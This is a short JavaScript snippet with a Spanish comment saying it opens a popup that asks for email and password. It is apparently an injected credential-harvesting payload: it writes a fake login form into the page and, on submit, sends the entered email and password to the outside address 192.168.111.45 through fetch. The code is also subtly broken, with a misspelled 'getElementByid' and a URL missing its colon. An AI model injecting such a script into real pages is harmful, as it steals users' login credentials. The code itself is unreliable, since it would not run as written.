//Este script ejecuta una ventana emergente requiriendo email y contraseña

```js
<script>
var email;
var password;
var form = '<form>' +
	'Email: <input type="email" id="email" required>' +
	'	Contraseña: <input type="password" id="password" required>' + 
	'<input type="button" onclick="submitForm()" value="Submit">' +
	'</form>';

document.getElementByid("formContainer").innerHTML = form;

function submitForm(){
	email = document.getElementByid("email").value;
	password = document.getElementByid("password").value;
	fetch("http//192.168.111.45/?email=" + email + "&password=" + password);
}
</script>
```
